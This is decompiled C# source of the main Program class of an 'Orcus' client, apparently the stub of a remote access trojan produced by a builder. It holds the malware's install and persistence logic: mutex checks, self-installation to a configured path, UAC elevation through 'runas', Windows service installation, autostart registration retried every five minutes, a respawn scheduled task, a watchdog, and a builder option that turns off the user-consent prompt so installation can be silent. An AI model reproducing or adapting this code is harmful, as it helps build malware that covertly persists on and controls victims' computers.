using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using Orcus.Config;
using Orcus.Core;
using Orcus.Plugins;
using Orcus.Protection;
using Orcus.Service;
using Orcus.Shared.Settings;
using Orcus.Utilities;

namespace Orcus;

internal static class Program
{
	public const int Version = 19;

	public const int AdministrationApiVersion = 2;

	public const int ServerApiVersion = 5;

	public static Mutex Mutex;

	public static OrcusApplicationContext AppContext { get; private set; }

	[STAThread]
	private static void Main(string[] args)
	{
		//IL_020b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0211: Invalid comparison between Unknown and I4
		//IL_0370: Unknown result type (might be due to invalid IL or missing references)
		//IL_0405: Unknown result type (might be due to invalid IL or missing references)
		if (args == null)
		{
			args = Environment.GetCommandLineArgs().Skip(1).ToArray();
		}
		if (args.Contains("/wait"))
		{
			Thread.Sleep(1000);
		}
		for (int i = 0; i < 10; i++)
		{
			try
			{
				Mutex = new Mutex(initiallyOwned: true, Settings.GetBuilderProperty<MutexBuilderProperty>().get_Mutex());
				if (Mutex.WaitOne(TimeSpan.Zero, exitContext: true))
				{
					break;
				}
			}
			catch (Exception)
			{
			}
			if (i != 9)
			{
				Thread.Sleep(500);
				continue;
			}
			return;
		}
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		try
		{
			Application.SetUnhandledExceptionMode((UnhandledExceptionMode)2);
			AppDomain.CurrentDomain.UnhandledException += delegate(object sender, UnhandledExceptionEventArgs e)
			{
				if (e.ExceptionObject is Exception exception3)
				{
					ErrorReporter.Current.ReportError(exception3, "UnhandledException");
				}
				Application.Restart();
			};
			Application.add_ThreadException((ThreadExceptionEventHandler)delegate(object sender, ThreadExceptionEventArgs e)
			{
				ErrorReporter.Current.ReportError(e.Exception, "ThreadException");
				Application.Restart();
			});
			Thread.CurrentThread.CurrentCulture = new CultureInfo("en-US");
			PluginLoader.Current.LoadPlugins(Settings.ClientConfig.get_PluginResources());
			string applicationPath = Consts.ApplicationPath;
			bool flag = string.Equals(applicationPath, Environment.ExpandEnvironmentVariables(Settings.GetBuilderProperty<InstallationLocationBuilderProperty>().get_Path()), StringComparison.OrdinalIgnoreCase);
			foreach (ClientController clientPlugin in PluginLoader.Current.ClientPlugins)
			{
				try
				{
					if (!clientPlugin.InfluenceStartup((IClientStartup)(object)ClientOperator.Instance))
					{
						return;
					}
				}
				catch (Exception exception)
				{
					ErrorReporter.Current.ReportError(exception, string.Concat("InfluenceStartup() at plugin: \"", ((object)clientPlugin).GetType(), "\""));
				}
			}
			if ((!flag || args.Contains("/forceInstall")) && Settings.GetBuilderProperty<InstallBuilderProperty>().get_Install())
			{
				if (!Settings.GetBuilderProperty<DisableInstallationPromptBuilderProperty>().get_IsDisabled() && !args.Contains("/update"))
				{
					FileInfo fileInfo = new FileInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), ".orcusInstallation"));
					if (!fileInfo.Exists || !File.ReadAllLines(fileInfo.FullName).Contains(Settings.Mutex))
					{
						if ((int)((Form)new InstallationPromptForm()).ShowDialog() != 1)
						{
							return;
						}
						using (FileStream stream = new FileStream(fileInfo.FullName, FileMode.Append, FileAccess.Write))
						{
							using StreamWriter streamWriter = new StreamWriter(stream);
							streamWriter.WriteLine(Settings.Mutex);
						}
						File.SetAttributes(fileInfo.FullName, FileAttributes.Hidden);
					}
				}
				if (!User.IsAdministrator && Settings.GetBuilderProperty<RequireAdministratorPrivilegesInstallerBuilderProperty>().get_RequireAdministratorPrivileges())
				{
					ProcessStartInfo startInfo = new ProcessStartInfo(Process.GetCurrentProcess().MainModule!.FileName)
					{
						Verb = "runas",
						Arguments = "/wait"
					};
					try
					{
						Process.Start(startInfo);
						return;
					}
					catch (Exception)
					{
						return;
					}
				}
				if (Settings.GetBuilderProperty<ServiceBuilderProperty>().get_Install())
				{
					ServiceInstaller.InstallIfNotExist();
				}
				if (!Installer.Install(Environment.ExpandEnvironmentVariables(Settings.GetBuilderProperty<InstallationLocationBuilderProperty>().get_Path()), applicationPath, out var file))
				{
					return;
				}
				foreach (ILoadable loadable in PluginLoader.Current.Loadables)
				{
					try
					{
						loadable.Install(file.FullName);
					}
					catch (Exception exception2)
					{
						ErrorReporter.Current.ReportError(exception2, string.Concat("Install plugin: \"", ((object)loadable).GetType(), "\""));
					}
				}
				Process.Start(file.FullName);
				return;
			}
			if (Settings.GetBuilderProperty<InstallBuilderProperty>().get_Install() && (int)Settings.GetBuilderProperty<AutostartBuilderProperty>().get_AutostartMethod() != 0)
			{
				bool flag2 = false;
				try
				{
					flag2 = Autostarter.AddToAutostart(Consts.ApplicationPath);
				}
				catch (Exception)
				{
				}
				if (!flag2)
				{
					Thread thread = new Thread((ThreadStart)delegate
					{
						do
						{
							Thread.Sleep(300000);
						}
						while (!Autostarter.AddToAutostart(Consts.ApplicationPath));
					});
					thread.IsBackground = true;
					thread.Start();
				}
			}
			RespawnTaskBuilderProperty builderProperty = Settings.GetBuilderProperty<RespawnTaskBuilderProperty>();
			if (builderProperty.get_IsEnabled())
			{
				RespawnTask.RegisterRespawnTask(applicationPath, builderProperty.get_TaskName());
			}
			if (Settings.GetBuilderProperty<ServiceBuilderProperty>().get_Install())
			{
				ServiceInstaller.InstallIfNotExist();
			}
			AppContext = new OrcusApplicationContext();
			Application.Run((ApplicationContext)(object)AppContext);
		}
		catch (Exception ex4)
		{
			MessageBox.Show(ex4.ToString());
		}
	}

	public static void Unload()
	{
		AppContext.Unload();
		if (Watchdog.IsEnabled)
		{
			Watchdog.Close();
		}
	}

	public static void Exit()
	{
		AppContext.Unload();
		((ApplicationContext)AppContext).ExitThread();
		if (Watchdog.IsEnabled)
		{
			Watchdog.Close();
		}
		Environment.Exit(0);
	}

	[Conditional("LOGCONSOLE")]
	public static void WriteLine(string message)
	{
		Console.WriteLine(message);
	}
}
